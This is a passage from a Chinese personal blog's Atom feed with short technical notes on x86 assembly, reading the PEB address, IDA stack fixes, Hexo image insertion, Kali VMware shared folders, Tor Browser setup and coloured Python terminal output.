    <content type="html"><![CDATA[<p>CMP OPR1，OPR2<br>OPR1OPR2运算，影响PF和ZF(OPR1=OPR2，ZF=1，PF=1;!=,ZF=0,PF=0)</p><p>LEA OPR1，OPR2<br>将OPR2的地址赋给OPR1</p><p>AND OPR1，OPR2<br>OPR1，OPR2与运算为0时，ZF标志位为1；与运算为1是，ZF为0。</p><p>IMUL OPR1，OPR2，OPR3<br>将OPR2*OPR3赋给OPR1。</p><a id="more"></a><p>jge opr1,opr2    两数比较，前者大于等于后者则跳。jump if greater or eaual.</p><p>rep stos dword ptr es:[edi]    rep重复操作前缀 stos从累加器EAX传送4个字节，到由EDI作为指针的目的串中，同时修改EDI以指向 串中的下一个单元。利用重复操作可以在串在建立一串相同的值。此指令对标志位无影响。</p><p>rep 为repeat 重复之意<br>stos 为sotre string 保存字符串之意<br>ptr 为pointer 指针之意</p><p>在一个函数中，它所申请的栈存放局部变量，在执行函数体运算的时候，将局部变量赋给寄存器（如eax），eax参加运算。结果保留在栈中</p><p>ebp-8处存放 int i；<br>i+1；</p><p>00411577 8b45f8          mov     eax,dword ptr [ebp-8]<br>0041157a 83c001          add     eax,1<br>0041157d 8945f8          mov     dword ptr [ebp-8],eax</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CMP OPR1，OPR2&lt;br&gt;OPR1OPR2运算，影响PF和ZF(OPR1=OPR2，ZF=1，PF=1;!=,ZF=0,PF=0)&lt;/p&gt;&lt;p&gt;LEA OPR1，OPR2&lt;br&gt;将OPR2的地址赋给OPR1&lt;/p&gt;&lt;p&gt;AND OPR1，OPR2&lt;br&gt;OPR1，OPR2与运算为0时，ZF标志位为1；与运算为1是，ZF为0。&lt;/p&gt;&lt;p&gt;IMUL OPR1，OPR2，OPR3&lt;br&gt;将OPR2*OPR3赋给OPR1。&lt;/p&gt;
    
    </summary>
    
    
      <category term="asm" scheme="http://youyanglam.github.io/categories/asm/"/>
    
    
  </entry>
  
  <entry>
    <title>PEB地址的取得</title>
    <link href="http://youyanglam.github.io/2019/12/11/PEB%E5%9C%B0%E5%9D%80%E7%9A%84%E5%8F%96%E5%BE%97/"/>
    <id>http://youyanglam.github.io/2019/12/11/PEB%E5%9C%B0%E5%9D%80%E7%9A%84%E5%8F%96%E5%BE%97/</id>
    <published>2019-12-11T08:32:19.000Z</published>
    <updated>2019-12-11T08:39:14.671Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PEB地址的取得"><a href="#PEB地址的取得" class="headerlink" title="PEB地址的取得"></a>PEB地址的取得</h3><ul><li>原理：FS段寄存器指向当前的TEB结构，在TEB偏移0x30处是PEB指针，通过这个指针即可取得PEB的地址。</li><li>实现方法：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">  mov eax,fs:[<span class="number">0x30</span>]</span><br><span class="line">  mov PEB,eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;PEB地址的取得&quot;&gt;&lt;a href=&quot;#PEB地址的取得&quot; class=&quot;headerlink&quot; title=&quot;PEB地址的取得&quot;&gt;&lt;/a&gt;PEB地址的取得&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;原理：FS段寄存器指向当前的TEB结构，在TEB偏移0x30处是PEB指针，通过
      
    
    </summary>
    
    
      <category term="asm" scheme="http://youyanglam.github.io/categories/asm/"/>
    
    
      <category term="peb" scheme="http://youyanglam.github.io/tags/peb/"/>
    
  </entry>
  
  <entry>
    <title>IDA中堆栈不平衡</title>
    <link href="http://youyanglam.github.io/2019/12/11/IDA%E4%B8%AD%E5%A0%86%E6%A0%88%E4%B8%8D%E5%B9%B3%E8%A1%A1/"/>
    <id>http://youyanglam.github.io/2019/12/11/IDA%E4%B8%AD%E5%A0%86%E6%A0%88%E4%B8%8D%E5%B9%B3%E8%A1%A1/</id>
    <published>2019-12-11T08:24:08.000Z</published>
    <updated>2019-12-13T06:08:38.486Z</updated>
    
    <content type="html"><![CDATA[<h3 id="F5堆栈不平衡，修改堆栈"><a href="#F5堆栈不平衡，修改堆栈" class="headerlink" title="F5堆栈不平衡，修改堆栈"></a>F5堆栈不平衡，修改堆栈</h3><img src="/2019/12/11/IDA%E4%B8%AD%E5%A0%86%E6%A0%88%E4%B8%8D%E5%B9%B3%E8%A1%A1/ida.jpg" width="90%" height="90%">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;F5堆栈不平衡，修改堆栈&quot;&gt;&lt;a href=&quot;#F5堆栈不平衡，修改堆栈&quot; class=&quot;headerlink&quot; title=&quot;F5堆栈不平衡，修改堆栈&quot;&gt;&lt;/a&gt;F5堆栈不平衡，修改堆栈&lt;/h3&gt;&lt;img src=&quot;/2019/12/11/IDA%E4%B8%A
      
    
    </summary>
    
    
      <category term="reverse" scheme="http://youyanglam.github.io/categories/reverse/"/>
    
    
      <category term="ida" scheme="http://youyanglam.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>hexo文章中插入图片</title>
    <link href="http://youyanglam.github.io/2019/12/11/hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
    <id>http://youyanglam.github.io/2019/12/11/hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</id>
    <published>2019-12-11T08:17:53.000Z</published>
    <updated>2019-12-13T06:23:48.007Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、修改hexo的-config-yml文件"><a href="#1、修改hexo的-config-yml文件" class="headerlink" title="1、修改hexo的_config.yml文件"></a>1、修改hexo的_config.yml文件</h3><blockquote><p>将_config.yml文件中的配置项post_asset_folder设为true后，执行命令$ hexo new post_name，在source/_posts中会生成文章post_name.md和同名文件夹post_name。将图片资源放在post_name中，文章就可以使用相对路径引用图片资源了。</p></blockquote><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="2、测试"><a href="#2、测试" class="headerlink" title="2、测试"></a>2、测试</h3><!--哈哈我是多段注释，不会在浏览器中显示。下面是markdown插入图片的语法，但是好像不支持定义图片大小：![测试图片](222.jpg)所以用下面的html格式插入图片了--><img src="/2019/12/11/hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/222.jpg" width="50%" height="50%"><h3 id="3、图片在首页中正常显示"><a href="#3、图片在首页中正常显示" class="headerlink" title="3、图片在首页中正常显示"></a>3、图片在首页中正常显示</h3><blockquote><p>上述是 Markdown 的引用方式，图片只能在文章中显示，但无法在首页中正常显示。<br>因为目标文档中使用的是相对路径，在首页中同样是相对路径，首页中就找不到图片的实际位置，最终不能显示。所以有人写了一款插件：hexo-asset-image，这款插件可以自动将图片地址替换为绝对路径。</p></blockquote><ul><li>安装方法也很简单<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure></li><li>安装完成后，插件实际是存放在了下面的目录<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\blog\node_modules\hexo-asset-image</span><br></pre></td></tr></table></figure></li><li>想要卸载这个插件，直接删掉这个文件夹就可以了</li></ul><h3 id="4、设置图片大小"><a href="#4、设置图片大小" class="headerlink" title="4、设置图片大小"></a>4、设置图片大小</h3><ul><li>下面是markdown插入图片的语法，但是好像不支持定义图片大小：<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">测试图片</span>](<span class="link">ida.jpg</span>)</span><br></pre></td></tr></table></figure></li><li>所以用下面的html格式插入图片了<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"ida.jpg"</span> <span class="attr">width</span>=<span class="string">"90%"</span> <span class="attr">height</span>=<span class="string">"90%"</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、修改hexo的-config-yml文件&quot;&gt;&lt;a href=&quot;#1、修改hexo的-config-yml文件&quot; class=&quot;headerlink&quot; title=&quot;1、修改hexo的_config.yml文件&quot;&gt;&lt;/a&gt;1、修改hexo的_config.yml文件&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;将_config.yml文件中的配置项post_asset_folder设为true后，执行命令$ hexo new post_name，在source/_posts中会生成文章post_name.md和同名文件夹post_name。将图片资源放在post_name中，文章就可以使用相对路径引用图片资源了。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
    
      <category term="hexo" scheme="http://youyanglam.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>kali 2019.4 vmware 设置共享目录</title>
    <link href="http://youyanglam.github.io/2019/12/06/kali-2019-4-vmware-%E8%AE%BE%E7%BD%AE%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95/"/>
    <id>http://youyanglam.github.io/2019/12/06/kali-2019-4-vmware-%E8%AE%BE%E7%BD%AE%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95/</id>
    <published>2019-12-06T08:37:59.000Z</published>
    <updated>2019-12-06T08:43:31.142Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、添加共享目录"><a href="#1、添加共享目录" class="headerlink" title="1、添加共享目录"></a>1、添加共享目录</h3><p>在mac上vmware给kali虚拟机添加共享目录</p><h3 id="2、映射到共享目录"><a href="#2、映射到共享目录" class="headerlink" title="2、映射到共享目录"></a>2、映射到共享目录</h3><h4 id="2-1、查看共享目录"><a href="#2-1、查看共享目录" class="headerlink" title="2.1、查看共享目录"></a>2.1、查看共享目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># vmware-hgfsclient</span></span><br></pre></td></tr></table></figure><h4 id="2-2、新建目录"><a href="#2-2、新建目录" class="headerlink" title="2.2、新建目录"></a>2.2、新建目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># mkdir /mnt/hgfs</span></span><br></pre></td></tr></table></figure><h4 id="2-3、创建映射"><a href="#2-3、创建映射" class="headerlink" title="2.3、创建映射"></a>2.3、创建映射</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、添加共享目录&quot;&gt;&lt;a href=&quot;#1、添加共享目录&quot; class=&quot;headerlink&quot; title=&quot;1、添加共享目录&quot;&gt;&lt;/a&gt;1、添加共享目录&lt;/h3&gt;&lt;p&gt;在mac上vmware给kali虚拟机添加共享目录&lt;/p&gt;&lt;h3 id=&quot;2、映射到共享目录
      
    
    </summary>
    
    
      <category term="linux" scheme="http://youyanglam.github.io/categories/linux/"/>
    
    
      <category term="kali" scheme="http://youyanglam.github.io/tags/kali/"/>
    
      <category term="vmware" scheme="http://youyanglam.github.io/tags/vmware/"/>
    
  </entry>
  
  <entry>
    <title>kali 2019.4 配置tor浏览器</title>
    <link href="http://youyanglam.github.io/2019/12/06/kali-2019-4-%E9%85%8D%E7%BD%AEtor%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    <id>http://youyanglam.github.io/2019/12/06/kali-2019-4-%E9%85%8D%E7%BD%AEtor%E6%B5%8F%E8%A7%88%E5%99%A8/</id>
    <published>2019-12-06T08:13:55.000Z</published>
    <updated>2019-12-06T08:45:45.031Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、下载tor浏览器"><a href="#1、下载tor浏览器" class="headerlink" title="1、下载tor浏览器"></a>1、下载tor浏览器</h3><pre><code>https://www.torproject.org/download/</code></pre><h3 id="2、解压并注册为桌面app"><a href="#2、解压并注册为桌面app" class="headerlink" title="2、解压并注册为桌面app"></a>2、解压并注册为桌面app</h3><h4 id="2-1、解压"><a href="#2-1、解压" class="headerlink" title="2.1、解压"></a>2.1、解压</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/opt<span class="comment"># tar -xvJf tor-browser-linux64-9.0.2_en-US.tar.xz</span></span><br></pre></td></tr></table></figure><h4 id="2-2、注释掉限制root用户启动的命令"><a href="#2-2、注释掉限制root用户启动的命令" class="headerlink" title="2.2、注释掉限制root用户启动的命令"></a>2.2、注释掉限制root用户启动的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/opt/tor-browser_en-US/Browser<span class="comment"># vim start-tor-browser</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"`id -u`"</span> -eq 0 ; <span class="keyword">then</span></span><br><span class="line">complain <span class="string">"The Tor Browser Bundle should not be run as root. Exiting."</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="2-3、注册为桌面app"><a href="#2-3、注册为桌面app" class="headerlink" title="2.3、注册为桌面app"></a>2.3、注册为桌面app</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/opt/tor-browser_en-US<span class="comment">#./start-tor-browser.desktop --register-app</span></span><br></pre></td></tr></table></figure><h3 id="3、启动tor并配置proxy"><a href="#3、启动tor并配置proxy" class="headerlink" title="3、启动tor并配置proxy"></a>3、启动tor并配置proxy</h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、下载tor浏览器&quot;&gt;&lt;a href=&quot;#1、下载tor浏览器&quot; class=&quot;headerlink&quot; title=&quot;1、下载tor浏览器&quot;&gt;&lt;/a&gt;1、下载tor浏览器&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;https://www.torproject.org/download/&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;2、解压并注册为桌面app&quot;&gt;&lt;a href=&quot;#2、解压并注册为桌面app&quot; class=&quot;headerlink&quot; title=&quot;2、解压并注册为桌面app&quot;&gt;&lt;/a&gt;2、解压并注册为桌面app&lt;/h3&gt;&lt;h4 id=&quot;2-1、解压&quot;&gt;&lt;a href=&quot;#2-1、解压&quot; class=&quot;headerlink&quot; title=&quot;2.1、解压&quot;&gt;&lt;/a&gt;2.1、解压&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@kali:/opt&lt;span class=&quot;comment&quot;&gt;# tar -xvJf tor-browser-linux64-9.0.2_en-US.tar.xz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&quot;2-2、注释掉限制root用户启动的命令&quot;&gt;&lt;a href=&quot;#2-2、注释掉限制root用户启动的命令&quot; class=&quot;headerlink&quot; title=&quot;2.2、注释掉限制root用户启动的命令&quot;&gt;&lt;/a&gt;2.2、注释掉限制root用户启动的命令&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@kali:/opt/tor-browser_en-US/Browser&lt;span class=&quot;comment&quot;&gt;# vim start-tor-browser&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;`id -u`&quot;&lt;/span&gt; -eq 0 ; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;complain &lt;span class=&quot;string&quot;&gt;&quot;The Tor Browser Bundle should not be run as root. Exiting.&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://youyanglam.github.io/categories/linux/"/>
    
    
      <category term="kali" scheme="http://youyanglam.github.io/tags/kali/"/>
    
      <category term="tor" scheme="http://youyanglam.github.io/tags/tor/"/>
    
  </entry>
  
  <entry>
    <title>python终端输出打印彩色字体</title>
    <link href="http://youyanglam.github.io/2019/12/05/python%E7%BB%88%E7%AB%AF%E8%BE%93%E5%87%BA%E6%89%93%E5%8D%B0%E5%BD%A9%E8%89%B2%E5%AD%97%E4%BD%93/"/>
    <id>http://youyanglam.github.io/2019/12/05/python%E7%BB%88%E7%AB%AF%E8%BE%93%E5%87%BA%E6%89%93%E5%8D%B0%E5%BD%A9%E8%89%B2%E5%AD%97%E4%BD%93/</id>
    <published>2019-12-05T14:38:40.000Z</published>
    <updated>2019-12-05T14:43:10.031Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、如下命令"><a href="#1、如下命令" class="headerlink" title="1、如下命令"></a>1、如下命令</h3><p>其中pargs是一个list，其实%后面的括号中为要输出的字符串即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"\033[0;32m%s\033[0m"</span>) % (<span class="string">"vm cmd: "</span> + <span class="string">" "</span>.join(cmd <span class="keyword">for</span> cmd <span class="keyword">in</span> pargs))</span><br></pre></td></tr></table></figure><h3 id="2、-参考"><a href="#2、-参考" class="headerlink" title="2、 参考"></a>2、 参考</h3><p>Python终端输出打印彩色字体的方法<br><a href="https://www.cnblogs.com/huchong/p/7516712.html" target="_blank" rel="noopener">https://www.cnblogs.com/huchong/p/7516712.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、如下命令&quot;&gt;&lt;a href=&quot;#1、如下命令&quot; class=&quot;headerlink&quot; title=&quot;1、如下命令&quot;&gt;&lt;/a&gt;1、如下命令&lt;/h3&gt;&lt;p&gt;其中pargs是一个list，其实%后面的括号中为要输出的字符串即可。&lt;/p&gt;&lt;figure class=&quot;
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
